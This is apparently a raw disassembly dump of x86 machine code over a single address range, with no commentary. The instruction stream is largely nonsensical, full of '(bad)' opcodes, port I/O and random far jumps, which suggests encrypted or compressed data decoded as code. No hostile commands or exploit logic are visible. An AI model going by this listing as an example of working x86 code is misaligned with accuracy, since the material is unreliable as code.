  420ece:	pop    edi
  420ecf:	pop    edi
  420ed0:	push   edi
  420ed1:	dec    eax
  420ed2:	cmp    BYTE PTR [esi-0x14],bh
  420ed5:	or     dl,BYTE PTR [esi-0x7a]
  420ed8:	xor    BYTE PTR [edx+0x19dda],bh
  420ede:	add    BYTE PTR [esi],0x0
  420ee1:	add    BYTE PTR [edi+0x4d],ch
  420ee4:	stos   DWORD PTR es:[edi],eax
  420ee5:	jmp    0x12b9b83f
  420eea:	sahf   
  420eeb:	fwait
  420eec:	outs   dx,DWORD PTR ds:[esi]
  420eed:	add    DWORD PTR [edi],edi
  420eef:	push   edi
  420ef0:	xchg   ecx,eax
  420ef1:	nop
  420ef2:	imul   eax,DWORD PTR [eax+0x6a925ef5],0xffffffe2
  420ef9:	mov    esi,0x69576163
  420efe:	add    al,0x34
  420f00:	adc    DWORD PTR [edx],edx
  420f02:	lds    ebp,FWORD PTR [eax+0x3b]
  420f05:	(bad)  
  420f06:	into   
  420f07:	push   edx
  420f08:	pushf  
  420f09:	mov    ss,WORD PTR [ebp+0x65bfb203]
  420f0f:	imul   BYTE PTR [edi-0x5c]
  420f12:	arpl   WORD PTR [esi],sp
  420f14:	push   esp
  420f15:	lods   al,BYTE PTR ds:[esi]
  420f16:	into   
  420f17:	jno    0x420f50
  420f19:	push   cs
  420f1a:	sbb    DWORD PTR [eax],0x6ab65f7d
  420f20:	stos   BYTE PTR es:[edi],al
  420f21:	and    eax,0xd7f9df4
  420f26:	jo     0x420f29
  420f28:	in     eax,0x31
  420f2a:	xchg   ebx,eax
  420f2b:	inc    DWORD PTR [eax+ecx*4+0x51]
  420f2f:	or     al,0x7a
  420f31:	pop    esp
  420f32:	pop    eax
  420f33:	prefetch BYTE PTR [ecx+0x64]
  420f37:	mov    cl,0x28
  420f39:	pop    edi
  420f3a:	jmp    0xc5bb:0x9ee087e4
  420f41:	sub    ebp,DWORD PTR [edi+0x20]
  420f44:	jle    0x420ed2
  420f46:	add    ah,BYTE PTR [eax+0xf]
  420f49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f4a:	ficom  WORD PTR [ebp+0x5c312d2e]
  420f50:	xchg   esi,eax
  420f51:	xor    eax,0x1d10880d
  420f56:	jnp    0x420fc3
  420f58:	in     al,dx
  420f59:	jo     0x420f37
  420f5b:	push   ss
  420f5c:	jb     0x420ee9
  420f5e:	sub    eax,0xc815ce2d
  420f63:	addr16 jo 0x420f74
  420f66:	inc    esp
  420f67:	add    eax,0xbbcb85ff
  420f6c:	outs   dx,BYTE PTR ds:[esi]
  420f6d:	fnstcw WORD PTR [eax+0x6a]
  420f70:	jne    0x420f5a
  420f72:	lods   al,BYTE PTR ds:[esi]
  420f73:	dec    ebp
  420f74:	test   al,dh
  420f76:	add    eax,0x18129dba
  420f7b:	aaa    
  420f7c:	xchg   edi,eax
  420f7d:	jge    0x420fb3
  420f7f:	retf   
  420f80:	cwde   
  420f81:	sub    DWORD PTR [edx+0x3b],esp
  420f84:	loopne 0x420f08
  420f86:	xchg   ebx,eax
  420f87:	sbb    al,0x19
  420f89:	mov    eax,ds:0x71923b2b
  420f8e:	push   0xffffffa7
  420f90:	sar    BYTE PTR [esi],cl
  420f92:	punpcklbw mm5,DWORD PTR [ebx-0x37e84b31]
  420f99:	dec    ebp
  420f9a:	sbb    DWORD PTR [ebp-0x7a],ecx
  420f9d:	out    dx,al
  420f9e:	mov    ds:0xdda414c5,eax
  420fa3:	call   0xdc6c:0xb0b57608
  420faa:	sahf   
  420fab:	(bad)  
  420fac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fad:	ror    dl,0x1b
  420fb0:	xor    edi,DWORD PTR [edx]
  420fb2:	out    dx,eax
  420fb3:	mov    al,ds:0xb8399cd3
  420fb8:	adc    DWORD PTR [ebx+0x193875d0],eax
  420fbe:	(bad)  
  420fbf:	in     al,0xe4
  420fc1:	outs   dx,BYTE PTR ds:[esi]
  420fc2:	ja     0x421041
  420fc4:	or     dl,bl
  420fc6:	sub    al,0x6c
  420fc8:	out    0xf6,eax
  420fca:	fcomp  DWORD PTR [ecx]
  420fcc:	xor    ebx,0xffffff85
  420fcf:	sbb    bl,bl
  420fd1:	xor    edi,DWORD PTR [esi+ebx*1+0x3d]
  420fd5:	in     al,0x98
  420fd7:	mov    esp,0x5a7ded7d
  420fdc:	sbb    al,0xae
  420fde:	jns    0x420fe7
  420fe0:	jmp    0x420f94
  420fe2:	pop    ebp
  420fe3:	add    DWORD PTR [ebp-0x35ae839f],0xfffffff3
  420fea:	test   DWORD PTR [edx],ebp
  420fec:	(bad)  
  420fee:	pop    ss
  420fef:	repnz sbb al,0xe4
  420ff2:	in     al,0x61
  420ff4:	aas    
  420ff5:	(bad)  
  420ff7:	loope  0x42106f
  420ff9:	mov    cl,BYTE PTR [esi+0x40]
  420ffc:	jbe    0x420f9b
  420ffe:	ja     0x421013
  421000:	xchg   esi,eax
  421001:	push   ebp
  421002:	xchg   BYTE PTR [edi],bl
  421004:	pop    esp
  421005:	add    eax,0x292c0d5d
  42100a:	adc    edi,DWORD PTR [esi+0x2b]
  42100d:	xor    eax,0x8cb30962
  421012:	inc    edi
  421013:	cld    
  421014:	les    edx,FWORD PTR [edx-0x44]
  421017:	sub    DWORD PTR [edx],ecx
  421019:	cmp    bh,BYTE PTR [ebp-0x65]
  42101c:	and    bh,BYTE PTR [ecx+eax*1+0x528abde8]
  421023:	(bad)  
  421024:	mov    eax,0x98c4cdae
  421029:	cmp    DWORD PTR [ecx],esi
  42102b:	imul   edi,esi,0xffffffef
  42102e:	cld    
  42102f:	sub    DWORD PTR [edi],esi
  421031:	data16 ja 0x4210ae
  421034:	retf   
  421035:	mov    ebp,0x9d591503
  42103a:	pop    ecx
  42103b:	add    eax,DWORD PTR [edx-0x53]
  42103e:	sti    
  42103f:	adc    DWORD PTR [edi-0x7b],eax
  421042:	inc    eax
  421043:	adc    edx,DWORD PTR [eax-0x3b]
  421046:	pop    ebp
  421047:	sbb    ah,ch
  421049:	pop    esi
  42104a:	pop    es
  42104b:	in     al,0x28
  42104d:	retf   
  42104e:	jmp    0x420fde
  421050:	sbb    BYTE PTR [ecx-0x6a6d1692],cl
  421056:	xor    ebx,DWORD PTR [eax+eiz*1]
  421059:	iret   
  42105a:	mov    ds:0x7bea3423,al
  42105f:	enter  0x7547,0xa0
  421063:	dec    eax
  421064:	das    
  421065:	daa    
  421066:	loope  0x4210ae
  421068:	sbb    DWORD PTR [eax+0x39ef1380],esp
  42106e:	jno    0x421003
  421070:	sbb    DWORD PTR [ebx+ecx*2+0x5a],ebp
  421074:	iret   
  421075:	daa    
  421076:	add    al,0x5f
  421078:	fs scas al,BYTE PTR es:[edi]
  42107a:	fistp  QWORD PTR [ebx-0x7e]
  42107d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42107e:	ins    DWORD PTR es:[edi],dx
  42107f:	fadd   DWORD PTR [eax+0x7a]
  421082:	stos   BYTE PTR es:[edi],al
  421083:	jmp    0xa5ee:0xe530bd02
  42108a:	push   eax
  42108b:	cmc    
  42108c:	call   0xbd040dc2
  421091:	mov    ebx,0x2bff1ef9
  421096:	mov    edx,0xac886076
  42109b:	dec    edi
  42109c:	jmp    0x42107b
  42109e:	dec    esi
  42109f:	xchg   ebp,eax
  4210a0:	jns    0x42110f
  4210a2:	push   edx
  4210a3:	into   
  4210a4:	xchg   edi,eax
  4210a5:	aam    0xcf
  4210a7:	mov    esp,0xd3222b36
  4210ac:	or     eax,0x6f57c0e0
  4210b1:	sti    
  4210b2:	mov    esp,0xbdd9ec50
  4210b7:	fwait
  4210b8:	lods   al,BYTE PTR ds:[esi]
  4210b9:	push   edx
  4210ba:	sub    BYTE PTR [ebp+eiz*1+0x696b36f1],bl
  4210c1:	push   ebp
  4210c2:	or     ecx,DWORD PTR [edi]
  4210c4:	shl    bl,0x1c
  4210c7:	add    cl,ah
  4210c9:	dec    eax
  4210ca:	xor    esi,ebx
  4210cc:	mov    ?,WORD PTR [edi+edi*4]
  4210cf:	pop    ebx
  4210d0:	and    eax,0xb623d970
  4210d5:	cmp    BYTE PTR [ebp-0x25611eef],ch
  4210db:	mov    al,0x17
  4210dd:	stos   BYTE PTR es:[edi],al
  4210de:	inc    esp
  4210df:	pop    ebx
  4210e0:	mov    bh,BYTE PTR [bx]
  4210e3:	(bad)  
  4210e4:	sub    eax,0xbc1c671b
  4210e9:	jl     0x421090
  4210eb:	mov    dl,0xc1
  4210ed:	jecxz  0x421084
  4210ef:	mov    bl,0xe3
  4210f1:	mov    cl,0x2f
  4210f3:	imul   edi,DWORD PTR [eax],0x1e
  4210f6:	mov    dh,0x22
  4210f8:	mov    ds:0x829b8fb9,eax
  4210fd:	outs   dx,BYTE PTR ds:[esi]
  4210fe:	mov    ebx,0x41442b9d
  421103:	(bad)  ds:0xd54f6aa0
  421109:	mov    ebx,0xe9199775
  42110e:	xor    eax,0xfb22a1f5
  421113:	stos   DWORD PTR es:[edi],eax
  421114:	cmp    eax,0x82f32cea
  421119:	int3   
  42111a:	adc    BYTE PTR [ebx],ch
  42111c:	aas    
  42111d:	std    
  42111e:	inc    edi
  42111f:	aam    0x3c
  421121:	jns    0x421181
  421123:	aas    
  421124:	pop    edx
  421125:	sti    
  421126:	loopne 0x42110b
  421128:	fistp  WORD PTR [ecx+0x5f606d35]
  42112e:	das    
  42112f:	push   0x7f
  421131:	pop    ecx
  421132:	inc    edi
  421133:	lods   al,BYTE PTR ds:[esi]
  421134:	add    edx,esp
  421136:	mov    al,BYTE PTR [esi+0x63]
  421139:	xor    bl,BYTE PTR [ebx*1-0x72a15d44]
  421140:	dec    eax
  421141:	adc    al,0x3d
  421143:	and    ah,al
  421145:	rcl    DWORD PTR ds:0x82133a4f,1
  42114b:	cmp    BYTE PTR [eax-0x6e],0x91
  42114f:	mov    dl,0x3d
  421151:	xchg   esp,eax
  421152:	out    dx,eax
  421153:	pop    eax
  421154:	shl    BYTE PTR [edx+edi*4-0x1e],cl
  421158:	in     eax,0x14
  42115a:	test   BYTE PTR [ebx+0x5ebeb267],dh
  421160:	hlt    
  421161:	inc    esp
  421162:	lods   al,BYTE PTR ds:[esi]
  421163:	push   es
  421164:	inc    eax
  421165:	jp     0x4211af
  421167:	(bad)  
  421168:	jb     0x42110c
  42116a:	xlat   BYTE PTR ds:[ebx]
  42116b:	ss push ss
  42116d:	jno    0x421173
  42116f:	jo     0x421182
  421171:	jbe    0x421172
  421173:	in     eax,0x4e
  421175:	popa   
  421176:	into   
  421177:	stos   BYTE PTR es:[edi],al
  421178:	(bad)  
  421179:	arpl   WORD PTR [esi+0x2d],dx
  42117c:	rcl    DWORD PTR [edi-0x7d2b98fe],cl
  421182:	sub    eax,0x5e988b62
  421187:	in     al,dx
  421188:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421189:	int3   
  42118a:	mov    ecx,?
  42118c:	shl    DWORD PTR [edi-0x5],0xea
  421190:	or     DWORD PTR [edx],ebx
  421192:	pop    ds
  421193:	mov    ch,0x46
  421195:	cdq    
  421196:	shl    eax,cl
  421198:	sahf   
  421199:	mov    eax,0x530a7cbd
  42119e:	repnz pop edx
  4211a0:	call   0x9adfdbea
  4211a5:	push   ecx
  4211a6:	pop    esp
  4211a7:	push   edx
  4211a8:	push   edx
  4211a9:	pop    eax
  4211aa:	mov    ebx,0x332c6d50
  4211af:	stc    
  4211b0:	test   eax,0xe6a27941
  4211b5:	fld    TBYTE PTR [ebx-0x6962c2ff]
  4211bb:	jae    0x4211d1
  4211bd:	xlat   BYTE PTR ds:[ebx]
  4211be:	lock test eax,0xf7247d36
  4211c4:	lahf   
  4211c5:	pop    edx
  4211c6:	enter  0xf6fb,0xcd
  4211ca:	in     al,0xce
  4211cc:	ss mov bh,0xc7
  4211cf:	call   0x45651bf0
  4211d4:	cli    
  4211d5:	add    ecx,0x42
  4211d8:	nop
  4211d9:	retf   0xcf46
  4211dc:	pop    ebx
  4211dd:	mov    edx,0xf35f1ac5
  4211e2:	push   edx
  4211e3:	sar    DWORD PTR [ecx+ebp*1-0x6cdc8830],1
  4211ea:	frstor [esi]
  4211ec:	sbb    BYTE PTR [ecx+0x780e2158],dl
  4211f2:	push   ds
  4211f3:	inc    ecx
  4211f4:	cwde   
  4211f5:	daa    
  4211f6:	push   ebx
  4211f7:	dec    edi
  4211f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211f9:	jae    0x421180
  4211fb:	mov    esi,0x259755c3
  421200:	fs nop
  421202:	pop    ebp
  421203:	xchg   edi,eax
  421204:	bound  esp,QWORD PTR [eax+0x7]
  421207:	sahf   
  421208:	xor    eax,0x4c6d5ec
  42120d:	inc    edx
  42120e:	adc    cl,BYTE PTR [eax+ecx*2+0x610b241f]
  421215:	mov    ebx,0x55953024
  42121a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42121b:	cmc    
  42121c:	(bad)  
  42121d:	push   0x54
  42121f:	push   edx
  421220:	fld    QWORD PTR [edi]
  421222:	pop    ds
  421223:	mov    ebp,0x1e36c3e6
  421228:	mov    cl,0xf5
  42122a:	out    dx,eax
  42122b:	enter  0x149,0x2f
  42122f:	aad    0x9b
  421231:	sub    eax,0xdde86cd6
  421236:	dec    DWORD PTR [esi]
  421238:	jecxz  0x4211c0
  42123a:	stc    
  42123b:	popa   
  42123c:	clc    
  42123d:	sub    ebp,esi
  42123f:	bnd jno 0x421296
  421242:	mov    bh,0x47
  421244:	sub    BYTE PTR [edx+0x76870f74],al
  42124a:	or     bh,ch
  42124c:	mov    eax,cs:0xb838127a
  421252:	pop    es
  421253:	test   eax,0xc697957
  421258:	inc    esi
  421259:	iret   
  42125a:	jbe    0x4211df
  42125c:	xchg   ebx,eax
  42125d:	aas    
  42125e:	sub    al,0xa4
  421260:	xor    BYTE PTR [ebp+0x44c890bf],al
  421266:	dec    eax
  421267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421268:	fwait
  421269:	in     eax,0x53
  42126b:	or     eax,0xce739c0a
  421270:	mov    ebx,0x7857a985
  421275:	and    al,0x2e
  421277:	cwde   
  421278:	jns    0x421260
  42127a:	dec    esp
  42127b:	es dec ebx
  42127d:	icebp  
  42127e:	jmp    0x40ff:0xfed6f0a4
  421285:	mov    dh,0xc
  421287:	sbb    BYTE PTR [ebx+0x5b334a4],ah
  42128d:	ret    
  42128e:	sbb    DWORD PTR [esp+edx*8-0x5c],eax
  421292:	cli    
  421293:	sbb    BYTE PTR [ecx+0xd],ch
  421296:	and    eax,0xfc5ee70c
  42129b:	pop    ebx
  42129c:	add    dl,ch
  42129e:	or     ebx,eax
  4212a0:	cmp    al,0xcd
  4212a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212a3:	les    esi,FWORD PTR [ecx+eiz*2+0x30fc2858]
  4212aa:	push   eax
  4212ab:	popf   
  4212ac:	fnsave [ecx+0x1c]
  4212af:	(bad)  
  4212b0:	mov    ecx,0xf5d4bd32
  4212b5:	dec    eax
  4212b6:	inc    ebx
  4212b7:	cmp    DWORD PTR [edx+ebx*1],edx
  4212ba:	and    DWORD PTR [ecx],ecx
  4212bc:	sti    
  4212bd:	mov    eax,ds:0x3d9b7a4a
  4212c2:	mov    eax,0xcb1c1c00
  4212c7:	mov    ds:0x2e4057a5,al
  4212cc:	lods   eax,DWORD PTR ds:[esi]
  4212cd:	leave  
  4212ce:	cld    
  4212cf:	data16 sbb al,0x2f
  4212d2:	xchg   ecx,eax
  4212d3:	fisttp WORD PTR [esi-0x7a8746a4]
  4212d9:	push   eax
  4212da:	push   0x32
  4212dc:	adc    BYTE PTR [ecx+eax*1+0x6be43e39],cl
  4212e3:	aaa    
  4212e4:	retf   0x8c50
  4212e7:	dec    ebp
  4212e8:	stos   BYTE PTR es:[edi],al
  4212e9:	adc    ah,BYTE PTR [esi-0x587ec325]
  4212ef:	and    eax,0x70ca6195
  4212f4:	and    DWORD PTR [edi],0xc40ca161
  4212fa:	stos   BYTE PTR es:[edi],al
  4212fb:	jecxz  0x4212fb
  4212fd:	push   ebp
  4212fe:	pusha  
  4212ff:	add    BYTE PTR [esi+0x3b],dh
  421302:	mov    ds:0xad91f65f,eax
  421307:	popf   
  421308:	nop
  421309:	mov    ebx,0xd3585d06
  42130e:	sbb    eax,DWORD PTR [ecx]
  421310:	(bad)  
  421311:	mul    BYTE PTR [edi+0x18]
  421314:	icebp  
  421315:	clc    
  421316:	dec    edx
  421317:	xchg   esp,eax
  421318:	add    ecx,edx
  42131a:	data16 jae 0x421337
  42131d:	test   BYTE PTR [eax+edx*2],al
  421320:	push   edx
  421321:	mov    ah,0x88
  421323:	adc    eax,0x9ff8ddba
  421328:	lea    esi,[eax]
  42132a:	add    ah,BYTE PTR [edi-0x2]
  42132d:	pop    ebp
  42132e:	clc    
  42132f:	dec    ebp
  421330:	sub    eax,0x7f5e021f
  421335:	cwde   
  421336:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421337:	aaa    
  421338:	out    dx,eax
  421339:	adc    esi,esi
  42133b:	stos   DWORD PTR es:[edi],eax
  42133c:	xor    BYTE PTR [ebx-0x46],al
  42133f:	sub    ecx,DWORD PTR [eax+esi*1]
  421342:	pop    ecx
  421343:	pop    ecx
  421344:	shr    ah,1
  421346:	sbb    BYTE PTR [ecx-0x3],bl
  421349:	iret   
  42134a:	pop    ss
  42134b:	jo     0x42138c
  42134d:	les    esi,FWORD PTR [ecx+0x2e5164a5]
  421353:	jae    0x4213b0
  421355:	cwde   
  421356:	ret    0xb4c5
  421359:	xchg   esi,eax
  42135a:	xor    al,0x49
  42135c:	jb     0xc96fd032
  421362:	jp     0x4213ba
  421364:	cmp    DWORD PTR [esi+0x7a],0x6f140bfb
  42136b:	aas    
  42136c:	les    ecx,FWORD PTR [ebx]
  42136e:	xchg   DWORD PTR [ebx+0x11fb8e93],ebx
  421374:	(bad)  
  421375:	mov    bl,0xb4
  421377:	dec    BYTE PTR [eax-0x58]
  42137a:	mov    bh,0x16
  42137c:	sar    DWORD PTR [ebp+0x2],cl
  42137f:	ret    
  421380:	ins    DWORD PTR es:[edi],dx
  421381:	loope  0x42132a
  421383:	push   edi
  421384:	sub    al,0x2b
  421386:	xchg   edi,eax
  421387:	adc    eax,0x6ab72e7d
  42138c:	xor    BYTE PTR [ecx+0x28],0xfc
  421390:	sub    eax,0x4906b250
  421395:	shr    BYTE PTR [eax-0x3b3d0420],1
  42139b:	dec    ecx
  42139c:	cmp    eax,0xa02763a6
  4213a1:	ret    
  4213a2:	loope  0x4213d2
  4213a4:	lea    ebp,[ecx]
  4213a6:	fild   QWORD PTR [edx+0x9d8876a]
  4213ac:	pop    ss
  4213ad:	push   edx
  4213ae:	shrd   DWORD PTR [eax+0x38133250],ebx,cl
  4213b5:	jo     0x4213bc
  4213b7:	jnp    0x4213bc
  4213b9:	dec    edi
  4213ba:	stos   BYTE PTR es:[edi],al
  4213bb:	inc    edx
  4213bc:	in     al,dx
  4213bd:	outs   dx,DWORD PTR ds:[esi]
  4213be:	clc    
  4213bf:	out    dx,eax
  4213c0:	or     DWORD PTR [ebp-0x7880f82f],ebp
  4213c6:	jmp    0x1d81:0x1fa4fc36
  4213cd:	or     edx,edi
  4213cf:	fcom   DWORD PTR [esi]
  4213d1:	sbb    al,0x0
  4213d3:	lds    ebx,FWORD PTR [eax-0x1cbef44]
  4213d9:	mov    ebx,DWORD PTR [eax+edi*4]
  4213dc:	push   esi
  4213dd:	ret    0xca80
  4213e0:	add    al,0xf9
  4213e2:	jae    0x4213c4
  4213e4:	or     al,BYTE PTR [ebx-0x41203ec7]
  4213ea:	jmp    0x42144b
  4213ec:	push   ds
  4213ed:	lods   eax,DWORD PTR ds:[esi]
  4213ee:	and    al,0xd3
  4213f0:	std    
  4213f1:	pop    ecx
  4213f2:	scas   al,BYTE PTR es:[edi]
  4213f3:	(bad)  
  4213f4:	mov    dl,0x3
  4213f6:	xchg   esi,eax
  4213f7:	push   ebx
  4213f8:	sub    al,0xb2
  4213fa:	xor    ah,dh
  4213fc:	dec    edx
  4213fd:	xor    DWORD PTR [esi],ebp
  4213ff:	sti    
  421400:	sub    al,bl
  421402:	ins    BYTE PTR es:[edi],dx
  421403:	xor    edi,DWORD PTR [edx-0x5d]
  421406:	jnp    0x4213e5
  421408:	push   eax
  421409:	xor    BYTE PTR [edx+ecx*4-0x3639234a],cl
  421410:	jbe    0x421462
  421412:	sbb    eax,0x9047a6c5
  421417:	jmp    0x39fa:0xbf2161ac
  42141e:	jecxz  0x421444
  421420:	push   0xfffffff2
  421422:	in     eax,dx
  421423:	jb     0x42143f
  421425:	pop    ebp
  421426:	or     eax,0xa213830
  42142b:	loopne 0x42143e
  42142d:	(bad)  
  42142e:	stos   DWORD PTR es:[edi],eax
  42142f:	leave  
  421430:	fdiv   DWORD PTR [edi-0xf]
  421433:	mov    dl,0xdc
  421435:	adc    al,0x34
  421437:	adc    DWORD PTR [edi],0x8914bd1c
  42143d:	fcmovu st,st(7)
  42143f:	xchg   esp,eax
  421440:	xchg   esi,eax
  421441:	fmul   DWORD PTR [esi+0x12bb5cfd]
  421447:	pop    eax
  421448:	mov    ebx,0x669548e6
  42144d:	ret    
  42144e:	or     DWORD PTR [eax],edi
  421450:	pop    ebp
  421451:	sbb    DWORD PTR [ebp-0x487ae037],eax
  421457:	push   ss
  421458:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421459:	and    edi,DWORD PTR [esi]
  42145b:	nop
  42145c:	inc    esi
  42145d:	(bad)  
  42145e:	and    bh,cl
  421460:	adc    bh,bh
  421462:	sub    DWORD PTR [esi],edx
  421464:	bound  eax,QWORD PTR [ecx+0x10b8d9af]
  42146a:	out    dx,eax
  42146b:	xor    BYTE PTR [eax+eax*1-0x168292ed],0x78
  421473:	jecxz  0x4214cd
  421475:	std    
  421476:	ror    dh,0x3e
  421479:	aas    
  42147a:	jae    0x4214a9
  42147c:	pop    eax
  42147d:	add    dh,BYTE PTR [edi]
  42147f:	xor    bl,BYTE PTR [edx-0x45c01682]
  421485:	mov    edx,0xb7943fa9
  42148a:	or     dl,dh
  42148c:	js     0x421424
  42148e:	hlt    
  42148f:	sbb    DWORD PTR [ebp-0x6a8badf4],esp
  421495:	and    ebp,DWORD PTR [eax+0x28529131]
  42149b:	xchg   edx,eax
  42149c:	pusha  
  42149d:	loop   0x421494
  42149f:	xor    ch,ah
  4214a1:	sub    ecx,DWORD PTR [edi+0x12]
  4214a4:	adc    DWORD PTR [edi],esp
  4214a6:	xor    eax,DWORD PTR [ebp+eiz*1+0x126ade8a]
  4214ad:	mov    ds:0xeb52bb2b,al
  4214b2:	dec    ebx
  4214b3:	or     DWORD PTR [edi-0x7c],edi
  4214b6:	(bad)  
  4214b7:	popa   
  4214b8:	addr16 mov edx,0x9336a613
  4214be:	fwait
  4214bf:	lods   eax,DWORD PTR ds:[esi]
  4214c0:	icebp  
  4214c1:	jo     0x421482
  4214c3:	inc    ebx
  4214c4:	je     0x4214b2
  4214c6:	iret   
  4214c7:	ret    
  4214c8:	add    BYTE PTR [edx],0xc3
  4214cb:	sub    ch,dh
  4214cd:	mov    WORD PTR [ebp-0x507f7e84],es
  4214d3:	rol    DWORD PTR [edx-0x2838f2b8],0x48
  4214da:	fldenv [eax*8-0x6442e71b]
  4214e1:	leave  
  4214e2:	adc    esi,DWORD PTR [edi-0x5f]
  4214e5:	and    al,0x3d
  4214e7:	fsubr  QWORD PTR [edi+0x3a99c8d8]
  4214ed:	iret   
  4214ee:	jne    0x4214fb
  4214f0:	sub    ch,BYTE PTR [ecx+ebp*4-0x1c]
  4214f4:	jle    0x42152f
  4214f6:	gs inc esp
  4214f8:	jno    0x42150e
  4214fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214fb:	sub    edx,eax
  4214fd:	mov    ds:0xecfc38e4,eax
  421502:	mov    esi,0xa281d180
  421507:	cmp    DWORD PTR [ebp-0x42],ecx
  42150a:	nop
  42150b:	xor    BYTE PTR [eax],dh
  42150d:	cmc    
  42150e:	ror    DWORD PTR [ebp+0x4995289d],1
  421514:	xchg   esp,eax
  421515:	lea    ebx,[edx]
  421517:	pop    ebx
  421518:	dec    ecx
  421519:	rcr    DWORD PTR [esi-0x80],cl
  42151c:	pop    edx
  42151d:	xchg   edi,eax
  42151e:	inc    ecx
  42151f:	addr16 adc edx,ebp
  421522:	jge    0x421598
  421524:	or     eax,0x7f67adc1
  421529:	popa   
  42152a:	and    al,0x72
  42152c:	mov    al,ds:0x73ae818
  421531:	jge    0x4215a7
  421533:	cmp    ebx,0x61bdb5d3
  421539:	add    al,0xab
  42153b:	and    DWORD PTR [ebx+0x38],edx
  42153e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42153f:	xchg   ebp,eax
  421540:	xchg   esi,eax
  421541:	dec    edx
  421542:	jnp    0x42152e
  421544:	outs   dx,BYTE PTR ds:[esi]
  421545:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421546:	pop    esi
  421547:	and    eax,0x5c3b43bd
  42154c:	(bad)  
  42154d:	dec    ebx
  42154e:	stos   DWORD PTR es:[edi],eax
  42154f:	jp     0x50f893cb
  421555:	jns    0x42159e
  421557:	mov    edx,0x642c304c
  42155c:	inc    ecx
  42155e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42155f:	cmp    al,0xfd
  421561:	ret    0xf7d2
  421564:	add    BYTE PTR [eax],al
  421566:	add    BYTE PTR [eax],al
  421568:	add    BYTE PTR [eax],al
  42156a:	push   edi
  42156b:	pop    edx
  42156c:	dec    edx
  42156d:	inc    esi
  42156e:	dec    edi
  42156f:	push   esi
  421570:	pop    edi
  421571:	pop    ebx
  421572:	push   esp
  421573:	inc    eax
  421574:	cmp    eax,0xd21040b5
  421579:	pop    es
  42157a:	pop    esp
  42157b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42157c:	add    DWORD PTR [eax],eax
  42157e:	add    BYTE PTR [esi],0x0
  421581:	add    dl,dl
  421583:	ss jg  0x42150a
  421586:	call   0x1f10:0x5e4accfd
  42158d:	(bad)  
  42158f:	lods   al,BYTE PTR ds:[esi]
  421590:	adc    ecx,DWORD PTR [ebx+edx*4]
  421593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421594:	arpl   sp,ax
  421596:	out    dx,eax
  421597:	shr    DWORD PTR [ebp+0x202b86ca],0x37
  42159e:	js     0x421526
  4215a0:	adc    edi,DWORD PTR [ebp+0xf]
  4215a3:	int3   
  4215a4:	cmovl  esi,ecx
  4215a7:	jno    0x4215b1
  4215a9:	mov    al,0xaa
  4215ab:	mov    bl,0x42
  4215ad:	dec    ebx
  4215ae:	pop    edx
  4215af:	out    0x37,eax
  4215b1:	add    al,0x79
  4215b3:	ret    0xf92d
  4215b6:	mov    ecx,0xd80998c3
  4215bb:	xchg   DWORD PTR [edx-0x34],ebx
  4215be:	or     DWORD PTR [edi],edx
  4215c0:	cli    
  4215c1:	jecxz  0x42155e
  4215c3:	push   eax
  4215c4:	test   DWORD PTR [edi+0x1cff2737],edi
  4215ca:	adc    ch,BYTE PTR [eax-0x3f4a9548]
  4215d0:	inc    ebp
  4215d1:	sbb    al,0xbd
  4215d3:	ins    DWORD PTR es:[edi],dx
  4215d4:	and    edx,DWORD PTR [eax+ebp*4+0x59]
  4215d8:	sti    
  4215d9:	std    
  4215da:	sbb    BYTE PTR [ecx-0x5c3baa4f],dh
  4215e0:	pop    ss
  4215e1:	xchg   esp,eax
  4215e2:	pop    ss
  4215e3:	xor    edx,DWORD PTR [esi]
  4215e5:	ins    DWORD PTR es:[edi],dx
  4215e6:	loopne 0x421654
  4215e8:	sub    cl,BYTE PTR [eax]
  4215ea:	jbe    0x4215ef
  4215ec:	repz int3 
  4215ee:	and    al,0x5
  4215f0:	in     al,dx
  4215f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215f2:	jp     0x421610
  4215f4:	mov    ecx,0xb257b843
  4215f9:	fwait
  4215fa:	and    dl,bl
  4215fc:	xchg   BYTE PTR [esi+0x28811416],cl
  421602:	sub    BYTE PTR [esi+edx*8-0x38],ah
  421606:	loop   0x4215f4
  421608:	cmp    edi,ecx
  42160a:	lds    esp,FWORD PTR [ebx-0x49c149aa]
  421610:	sbb    ebx,DWORD PTR [ebp-0x41]
  421613:	mov    ds:0x2c928a8c,al
  421618:	xor    BYTE PTR [esi],ah
  42161a:	xor    DWORD PTR ds:0x593a7b18,edi
  421620:	sbb    edx,DWORD PTR [ebp+0x3c]
  421623:	inc    eax
  421624:	push   ebx
  421625:	mov    edx,0x5faa14ea
  42162a:	fimul  WORD PTR [eax]
  42162c:	pop    ecx
  42162d:	and    DWORD PTR [edx+esi*8],esi
  421630:	rcl    DWORD PTR [eax-0x67572954],cl
  421636:	ins    BYTE PTR es:[edi],dx
  421637:	push   ss
  421638:	daa    
  421639:	xor    esi,ebp
  42163b:	bound  esi,QWORD PTR [edx+0x54]
  42163e:	out    dx,eax
  42163f:	inc    esi
  421640:	inc    ebp
  421641:	mov    bh,0xb
  421643:	(bad)  
  421644:	fnstenv [ebp-0x57]
  421647:	sbb    ah,BYTE PTR [eax-0x35306e9a]
  42164d:	mov    esp,0x6dcdb44b
  421652:	in     al,0x96
  421654:	add    eax,0xcb999d38
  421659:	nop
  42165a:	arpl   di,cx
  42165c:	pop    es
  42165d:	js     0x42166d
  42165f:	xor    DWORD PTR [ecx],edx
  421661:	add    BYTE PTR [esi],bl
  421663:	cmp    eax,0x9d6d0f07
  421668:	scas   eax,DWORD PTR es:[edi]
